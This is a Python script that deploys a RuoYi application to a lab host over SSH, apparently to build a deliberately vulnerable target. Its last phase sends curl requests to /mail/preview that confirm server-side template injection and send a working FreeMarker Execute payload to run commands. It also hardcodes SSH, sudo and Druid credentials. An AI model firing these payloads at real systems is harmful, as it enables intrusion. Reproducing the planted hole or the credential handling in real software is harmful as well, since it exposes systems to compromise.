#!/usr/bin/env python3
"""Comprehensive C1 deployment: fix Java sources, write POMs, build, deploy, verify"""
import paramiko, time, sys

host = '192.168.101.140'
user = 'gdadmin'
pwd = 'Gdadmin@123'

SOURCE_FIXES = {
    # RuoYiApplication.java: SB4 package → SB3 package
    '/opt/oa-app/ruoyi/ruoyi-admin/src/main/java/com/ruoyi/RuoYiApplication.java': [
        ('org.springframework.boot.jdbc.autoconfigure.DataSourceAutoConfiguration',
         'org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration'),
    ],
}

def run_ssh(client, cmd, timeout=600):
    """Run a command and print results"""
    print(f"  $ {cmd[:120]}{'...' if len(cmd) > 120 else ''}")
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        tail = out.strip()[-500:]
        if len(out) > 500:
            print(f"    stdout ({len(out)} chars): ...{tail}")
        else:
            print(f"    stdout: {out.strip()}")
    if err.strip():
        print(f"    stderr: {err.strip()[-300:]}")
    return out, err, ec

print("=" * 60)
print("C1 RuoYi Deployment Script")
print("=" * 60)

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(host, username=user, password=pwd, timeout=10)
print(f"Connected to {host}")

# ──────────────────────────────────────────────
# PHASE 1: Apply Java source code fixes
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 1: Source Code Fixes")
print("=" * 60)

for filepath, replacements in SOURCE_FIXES.items():
    sftp = c.open_sftp()
    try:
        with sftp.open(filepath, 'r') as f:
            content = f.read().decode('utf-8')
    except Exception as e:
        print(f"  WARNING: Cannot read {filepath}: {e}")
        sftp.close()
        continue

    modified = False
    for old, new in replacements:
        if old in content:
            content = content.replace(old, new)
            print(f"  Fixed: {filepath}")
            print(f"    {old} → {new}")
            modified = True

    if modified:
        with sftp.open(filepath, 'w') as f:
            f.write(content.encode('utf-8'))
        print(f"  Written back: {filepath}")

    sftp.close()

# ──────────────────────────────────────────────
# PHASE 2: Write pom.xml files
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 2: Writing pom.xml Files")
print("=" * 60)

# Root POM (Spring Boot 3.0.3, Shiro 2.1.0 jakarta, mybatis 3.0.5)
ROOT_POM = '''<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.ruoyi</groupId>
    <artifactId>ruoyi</artifactId>
    <version>4.8.3</version>

    <name>ruoyi</name>
    <url>http://www.ruoyi.vip</url>
    <description>若依管理系统</description>

    <properties>
        <ruoyi.version>4.8.3</ruoyi.version>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
        <java.version>17</java.version>
        <maven-jar-plugin.version>3.1.1</maven-jar-plugin.version>
        <spring-boot.version>3.0.3</spring-boot.version>
        <shiro.version>2.1.0</shiro.version>
        <mybatis-spring-boot.version>3.0.5</mybatis-spring-boot.version>
        <thymeleaf.extras.shiro.version>2.1.0</thymeleaf.extras.shiro.version>
        <druid.version>1.2.28</druid.version>
        <yauaa.version>8.1.0</yauaa.version>
        <kaptcha.version>2.3.3</kaptcha.version>
        <pagehelper.boot.version>2.1.1</pagehelper.boot.version>
        <fastjson.version>1.2.83</fastjson.version>
        <oshi.version>6.10.0</oshi.version>
        <commons.io.version>2.21.0</commons.io.version>
        <poi.version>4.1.2</poi.version>
        <velocity.version>2.3</velocity.version>
        <freemarker.version>2.3.31</freemarker.version>
        <springdoc.version>2.5.0</springdoc.version>
    </properties>

    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-dependencies</artifactId>
                <version>${spring-boot.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
            <dependency>
                <groupId>com.alibaba</groupId>
                <artifactId>druid-spring-boot-3-starter</artifactId>
                <version>${druid.version}</version>
            </dependency>
            <dependency>
                <groupId>pro.fessional</groupId>
                <artifactId>kaptcha</artifactId>
                <version>${kaptcha.version}</version>
            </dependency>
            <dependency>
                <groupId>org.apache.shiro</groupId>
                <artifactId>shiro-core</artifactId>
                <classifier>jakarta</classifier>
                <version>${shiro.version}</version>
            </dependency>
            <dependency>
                <groupId>org.apache.shiro</groupId>
                <artifactId>shiro-web</artifactId>
                <classifier>jakarta</classifier>
                <version>${shiro.version}</version>
            </dependency>
            <dependency>
                <groupId>org.apache.shiro</groupId>
                <artifactId>shiro-spring</artifactId>
                <classifier>jakarta</classifier>
                <version>${shiro.version}</version>
                <exclusions>
                    <exclusion>
                        <groupId>org.apache.shiro</groupId>
                        <artifactId>shiro-web</artifactId>
                    </exclusion>
                </exclusions>
            </dependency>
            <dependency>
                <groupId>org.apache.shiro</groupId>
                <artifactId>shiro-ehcache</artifactId>
                <version>${shiro.version}</version>
            </dependency>
            <dependency>
                <groupId>com.github.theborakompanioni</groupId>
                <artifactId>thymeleaf-extras-shiro</artifactId>
                <version>${thymeleaf.extras.shiro.version}</version>
            </dependency>
            <dependency>
                <groupId>org.mybatis.spring.boot</groupId>
                <artifactId>mybatis-spring-boot-starter</artifactId>
                <version>${mybatis-spring-boot.version}</version>
            </dependency>
            <dependency>
                <groupId>nl.basjes.parse.useragent</groupId>
                <artifactId>yauaa</artifactId>
                <version>${yauaa.version}</version>
            </dependency>
            <dependency>
                <groupId>com.github.pagehelper</groupId>
                <artifactId>pagehelper-spring-boot-starter</artifactId>
                <version>${pagehelper.boot.version}</version>
            </dependency>
            <dependency>
                <groupId>com.github.oshi</groupId>
                <artifactId>oshi-core</artifactId>
                <version>${oshi.version}</version>
            </dependency>
            <dependency>
                <groupId>commons-io</groupId>
                <artifactId>commons-io</artifactId>
                <version>${commons.io.version}</version>
            </dependency>
            <dependency>
                <groupId>org.apache.poi</groupId>
                <artifactId>poi-ooxml</artifactId>
                <version>${poi.version}</version>
            </dependency>
            <dependency>
                <groupId>org.apache.velocity</groupId>
                <artifactId>velocity-engine-core</artifactId>
                <version>${velocity.version}</version>
            </dependency>
            <dependency>
                <groupId>org.freemarker</groupId>
                <artifactId>freemarker</artifactId>
                <version>${freemarker.version}</version>
            </dependency>
            <dependency>
                <groupId>org.springdoc</groupId>
                <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
                <version>${springdoc.version}</version>
            </dependency>
            <dependency>
                <groupId>com.alibaba</groupId>
                <artifactId>fastjson</artifactId>
                <version>${fastjson.version}</version>
            </dependency>
            <dependency>
                <groupId>com.ruoyi</groupId>
                <artifactId>ruoyi-quartz</artifactId>
                <version>${ruoyi.version}</version>
            </dependency>
            <dependency>
                <groupId>com.ruoyi</groupId>
                <artifactId>ruoyi-generator</artifactId>
                <version>${ruoyi.version}</version>
            </dependency>
            <dependency>
                <groupId>com.ruoyi</groupId>
                <artifactId>ruoyi-framework</artifactId>
                <version>${ruoyi.version}</version>
            </dependency>
            <dependency>
                <groupId>com.ruoyi</groupId>
                <artifactId>ruoyi-system</artifactId>
                <version>${ruoyi.version}</version>
            </dependency>
            <dependency>
                <groupId>com.ruoyi</groupId>
                <artifactId>ruoyi-common</artifactId>
                <version>${ruoyi.version}</version>
            </dependency>
        </dependencies>
    </dependencyManagement>

    <modules>
        <module>ruoyi-admin</module>
        <module>ruoyi-framework</module>
        <module>ruoyi-system</module>
        <module>ruoyi-quartz</module>
        <module>ruoyi-generator</module>
        <module>ruoyi-common</module>
    </modules>
    <packaging>pom</packaging>

    <dependencies>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>3.13.0</version>
                <configuration>
                    <parameters>true</parameters>
                    <source>${java.version}</source>
                    <target>${java.version}</target>
                    <encoding>${project.build.sourceEncoding}</encoding>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <version>${spring-boot.version}</version>
            </plugin>
        </plugins>
    </build>

    <repositories>
        <repository>
            <id>public</id>
            <name>aliyun nexus</name>
            <url>https://maven.aliyun.com/repository/public</url>
            <releases>
                <enabled>true</enabled>
            </releases>
        </repository>
    </repositories>

    <pluginRepositories>
        <pluginRepository>
            <id>public</id>
            <name>aliyun nexus</name>
            <url>https://maven.aliyun.com/repository/public</url>
            <releases>
                <enabled>true</enabled>
            </releases>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </pluginRepository>
    </pluginRepositories>
</project>'''

ADMIN_POM = '''<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <parent>
        <artifactId>ruoyi</artifactId>
        <groupId>com.ruoyi</groupId>
        <version>4.8.3</version>
    </parent>
    <modelVersion>4.0.0</modelVersion>
    <packaging>jar</packaging>
    <artifactId>ruoyi-admin</artifactId>

    <description>web服务入口</description>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springdoc</groupId>
            <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
        </dependency>
        <dependency>
            <groupId>com.mysql</groupId>
            <artifactId>mysql-connector-j</artifactId>
        </dependency>
        <dependency>
            <groupId>com.ruoyi</groupId>
            <artifactId>ruoyi-framework</artifactId>
        </dependency>
        <dependency>
            <groupId>com.ruoyi</groupId>
            <artifactId>ruoyi-quartz</artifactId>
        </dependency>
        <dependency>
            <groupId>com.ruoyi</groupId>
            <artifactId>ruoyi-generator</artifactId>
        </dependency>
        <dependency>
            <groupId>org.freemarker</groupId>
            <artifactId>freemarker</artifactId>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <configuration>
                    <addResources>true</addResources>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>repackage</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-war-plugin</artifactId>
                <version>3.1.0</version>
                <configuration>
                    <failOnMissingWebXml>false</failOnMissingWebXml>
                    <warName>${project.artifactId}</warName>
                </configuration>
            </plugin>
        </plugins>
        <finalName>${project.artifactId}</finalName>
    </build>
</project>'''

FRAMEWORK_POM = '''<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <parent>
        <artifactId>ruoyi</artifactId>
        <groupId>com.ruoyi</groupId>
        <version>4.8.3</version>
    </parent>
    <modelVersion>4.0.0</modelVersion>
    <artifactId>ruoyi-framework</artifactId>

    <description>framework核心</description>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-aop</artifactId>
        </dependency>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>druid-spring-boot-3-starter</artifactId>
        </dependency>
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-spring</artifactId>
            <classifier>jakarta</classifier>
        </dependency>
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-core</artifactId>
            <classifier>jakarta</classifier>
        </dependency>
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-web</artifactId>
            <classifier>jakarta</classifier>
        </dependency>
        <dependency>
            <groupId>pro.fessional</groupId>
            <artifactId>kaptcha</artifactId>
            <exclusions>
                <exclusion>
                    <artifactId>servlet-api</artifactId>
                    <groupId>javax.servlet</groupId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>com.github.theborakompanioni</groupId>
            <artifactId>thymeleaf-extras-shiro</artifactId>
        </dependency>
        <dependency>
            <groupId>com.github.oshi</groupId>
            <artifactId>oshi-core</artifactId>
        </dependency>
        <dependency>
            <groupId>com.ruoyi</groupId>
            <artifactId>ruoyi-system</artifactId>
        </dependency>
    </dependencies>
</project>'''

GENERATOR_POM = '''<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <parent>
        <artifactId>ruoyi</artifactId>
        <groupId>com.ruoyi</groupId>
        <version>4.8.3</version>
    </parent>
    <modelVersion>4.0.0</modelVersion>
    <artifactId>ruoyi-generator</artifactId>

    <description>代码生成</description>

    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>druid-spring-boot-3-starter</artifactId>
        </dependency>
        <dependency>
            <groupId>org.apache.velocity</groupId>
            <artifactId>velocity-engine-core</artifactId>
        </dependency>
        <dependency>
            <groupId>com.ruoyi</groupId>
            <artifactId>ruoyi-common</artifactId>
        </dependency>
    </dependencies>
</project>'''

pom_files = {
    '/opt/oa-app/ruoyi/pom.xml': ROOT_POM,
    '/opt/oa-app/ruoyi/ruoyi-admin/pom.xml': ADMIN_POM,
    '/opt/oa-app/ruoyi/ruoyi-framework/pom.xml': FRAMEWORK_POM,
    '/opt/oa-app/ruoyi/ruoyi-generator/pom.xml': GENERATOR_POM,
}

sftp = c.open_sftp()
for path, content in pom_files.items():
    with sftp.open(path, 'w') as f:
        f.write(content.encode('utf-8'))
    print(f"  Written: {path}")
sftp.close()

# ──────────────────────────────────────────────
# PHASE 3: Validate POMs
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 3: Validate POMs")
print("=" * 60)
out, err, ec = run_ssh(c, 'cd /opt/oa-app/ruoyi && mvn validate 2>&1 | tail -15', timeout=120)
if ec != 0:
    print("POM validation FAILED!")
    sys.exit(1)
print("  POMs validate OK")

# ──────────────────────────────────────────────
# PHASE 4: Build
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 4: Build (mvn clean package -DskipTests)")
print("=" * 60)
out, err, ec = run_ssh(c,
    'cd /opt/oa-app/ruoyi && MAVEN_OPTS="-Xmx2g" mvn clean package -DskipTests 2>&1 | tail -30',
    timeout=600)
if 'BUILD SUCCESS' not in out:
    print("\nBuild FAILED! Checking errors...")
    run_ssh(c, 'cd /opt/oa-app/ruoyi && mvn compile 2>&1 | grep "ERROR" | tail -20', timeout=300)
    sys.exit(1)
print("  BUILD SUCCESS!")

# ──────────────────────────────────────────────
# PHASE 5: Fix application.yml
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 5: Fix application.yml")
print("=" * 60)
fix_cmds = [
    # Fix profile path
    "sed -i 's|profile: D:/ruoyi/uploadPath|profile: /opt/oa-app/uploadPath|' /opt/oa-app/ruoyi/ruoyi-admin/src/main/resources/application.yml",
    # Fix server port (80 → 8080, Nginx is on 80)
    "sed -i 's|port: 80|port: 8080|' /opt/oa-app/ruoyi/ruoyi-admin/src/main/resources/application.yml",
]
for cmd in fix_cmds:
    run_ssh(c, cmd, timeout=10)

# Verify
out, err, ec = run_ssh(c, 'grep -E "profile:|port:" /opt/oa-app/ruoyi/ruoyi-admin/src/main/resources/application.yml')
print(f"  Config: {out.strip()}")

# ──────────────────────────────────────────────
# PHASE 6: Update JAR with yml files
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 6: Update JAR")
print("=" * 60)
run_ssh(c,
    'cd /opt/oa-app/ruoyi/ruoyi-admin/target && '
    'mkdir -p BOOT-INF/classes && '
    'cp ../src/main/resources/application.yml BOOT-INF/classes/ && '
    'cp ../src/main/resources/application-druid.yml BOOT-INF/classes/ && '
    'jar uf ruoyi-admin.jar BOOT-INF/classes/application.yml BOOT-INF/classes/application-druid.yml 2>&1 && '
    'echo JAR_UPDATED')
print("  JAR updated with yml files")

# ──────────────────────────────────────────────
# PHASE 7: Copy yml to /opt/oa-app/
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 7: Copy Config Files")
print("=" * 60)
for f in ['application.yml', 'application-druid.yml']:
    run_ssh(c,
        f"echo '{pwd}' | sudo -S cp /opt/oa-app/ruoyi/ruoyi-admin/src/main/resources/{f} /opt/oa-app/{f}")
print("  Config files copied to /opt/oa-app/")

# Create uploadPath
run_ssh(c,
    f"echo '{pwd}' | sudo -S mkdir -p /opt/oa-app/uploadPath && "
    f"echo '{pwd}' | sudo -S chmod 755 /opt/oa-app/uploadPath")
print("  uploadPath created")

# ──────────────────────────────────────────────
# PHASE 8: Fix Nginx config
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 8: Fix Nginx Reverse Proxy")
print("=" * 60)

nginx_config = '''server {
    listen 80 default_server;
    server_name _;

    location /mail/preview {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location /mail {
        proxy_pass http://127.0.0.1:8081;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}'''

sftp = c.open_sftp()
with sftp.open('/tmp/nginx-default', 'w') as f:
    f.write(nginx_config.encode('utf-8'))
sftp.close()

run_ssh(c, f"echo '{pwd}' | sudo -S cp /tmp/nginx-default /etc/nginx/sites-enabled/default")
run_ssh(c, f"echo '{pwd}' | sudo -S nginx -t 2>&1")
run_ssh(c, f"echo '{pwd}' | sudo -S systemctl reload nginx 2>&1")
print("  Nginx reloaded")

# ──────────────────────────────────────────────
# PHASE 9: Restart Service
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 9: Restart oa-app Service")
print("=" * 60)

for cmd in [
    f"echo '{pwd}' | sudo -S systemctl stop oa-app 2>/dev/null; true",
    f"echo '{pwd}' | sudo -S systemctl reset-failed oa-app 2>/dev/null; true",
    f"echo '{pwd}' | sudo -S systemctl start oa-app",
]:
    run_ssh(c, cmd)

print("  Waiting 45s for startup...")
time.sleep(45)

# ──────────────────────────────────────────────
# PHASE 10: Verify
# ──────────────────────────────────────────────
print("\n" + "=" * 60)
print("PHASE 10: Verification")
print("=" * 60)

# Service status
out, err, ec = run_ssh(c, f"echo '{pwd}' | sudo -S systemctl is-active oa-app")
print(f"  Service: {out.strip()}")

# Port check
out, err, ec = run_ssh(c, "ss -tlnp | grep -E '8080|8081|:80 '")
print(f"  Ports: {out.strip()}")

# Log check
out, err, ec = run_ssh(c, f"echo '{pwd}' | sudo -S journalctl -u oa-app --no-pager -n 5 2>/dev/null")
if 'Started RuoYi' in out or 'Tomcat started' in out:
    print("  Log: ✅ Application started successfully")
elif 'FAILED' in out or 'Port 80' in out:
    print("  Log: ❌ Application failed!")
    print(f"    {out.strip()[-500:]}")
else:
    print(f"  Log: (checking) {out.strip()[-200:]}")

# HTTP endpoint checks
print("\n  HTTP Endpoint Verification:")
tests = [
    ("GET /", "http://localhost/"),
    ("GET /register", "http://localhost/register"),
    ("GET /login", "http://localhost/login"),
    ("GET /api/admin/users", "http://localhost/api/admin/users"),
    ("GET /druid/", "http://localhost/druid/"),
]
for name, url in tests:
    out, err, ec = run_ssh(c, f"curl -s -o /dev/null -w '%{{http_code}}' {url} 2>/dev/null")
    print(f"    {name}: HTTP {out.strip()}")

# SSTI verification
print("\n  SSTI Verification (/mail/preview):")
out, err, ec = run_ssh(c,
    "curl -s 'http://localhost/mail/preview?content=%24%7B7*7%7D' 2>/dev/null")
ssti_result = out.strip()
if ssti_result == '49':
    print(f"    ✅ ${7*7} = {ssti_result} (SSTI confirmed)")
else:
    print(f"    ❌ Expected 49, got: {ssti_result}")

# RCE verification
out, err, ec = run_ssh(c,
    "curl -s 'http://localhost/mail/preview?content=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bex(%22id%22)%7D' 2>/dev/null")
rce_result = out.strip()
if 'uid=' in rce_result:
    print(f"    ✅ RCE confirmed: {rce_result[:80]}")
else:
    print(f"    ⚠️ RCE response: {rce_result[:100]}")

c.close()
print("\n" + "=" * 60)
print("C1 DEPLOYMENT COMPLETE!")
print("=" * 60)
print(f"External: http://{host}/")
print(f"Register: http://{host}/register")
print(f"SSTI:     http://{host}/mail/preview?content=${{7*7}}")
print(f"Druid:    http://{host}/druid/ (ruoyi/123456)")
print(f"API:      http://{host}/api/admin/users")
print(f"Roundcube: http://{host}/mail/")
